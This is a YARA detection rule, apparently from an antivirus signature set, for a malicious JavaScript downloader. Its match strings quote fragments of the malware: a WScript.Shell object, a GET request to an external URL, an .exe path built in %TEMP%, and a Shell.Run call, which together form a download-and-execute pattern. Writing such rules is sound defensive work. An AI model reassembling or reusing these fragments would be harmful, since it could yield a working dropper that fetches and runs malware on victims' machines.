rule sig_20160330_b8ba901051660d25343a9c0d5bd58589 {
  meta:
    description = "datamaliciousorder - file 20160330_b8ba901051660d25343a9c0d5bd58589.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "6f2394724ef26d4435bccfb5032f42ccea3a1ec71ee6238f6e4871f988d3fcbb"

  strings:
    $s1  = "var MC = function ZN() {return WScript[W](\"WScript\"+\".Shell\");}(), ZG = 11;" fullword ascii
    $s2  = "function LT(O, OU){CC = CC * 1; return O - OU;};" fullword ascii
    $s3  = "CB[E](\"GET\", \"http://ekotrade.pl/m4ujda\", false);" fullword ascii
    $s4  = "if (CB[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function WW() {return MC[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"m7bPhNTifsR.ex\" + \"e\";};" fullword ascii
    $s6  = "function TF(){return AU + \"\";};" fullword ascii
    $s7  = "function SF(QI){MC[\"Run\"](QI, CC, CC);};" fullword ascii
    $s8  = "function IH() {return ((Q == true) && (Q == FK)) ? 1 : CC;};" fullword ascii
    $s9  = "function K()" fullword ascii
    $s10 = "}while (E0);" fullword ascii
    $s11 = "function J(){return W;};" fullword ascii
    $s12 = "return LT(KE, P);" fullword ascii
    $s13 = "function ZP(){return 22;};" fullword ascii
    $s14 = "var QQ = new this[\"Date\"]();" fullword ascii
    $s15 = "function UL(X) {var RP = (1, 2, 3, 4, 5, X); return RP;};" fullword ascii
    $s16 = "Q = true; " fullword ascii
    $s17 = "var Q = false;" fullword ascii
    $s18 = "var FK = false;" fullword ascii
    $s19 = "FK = true; " fullword ascii
    $s20 = "var NN = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}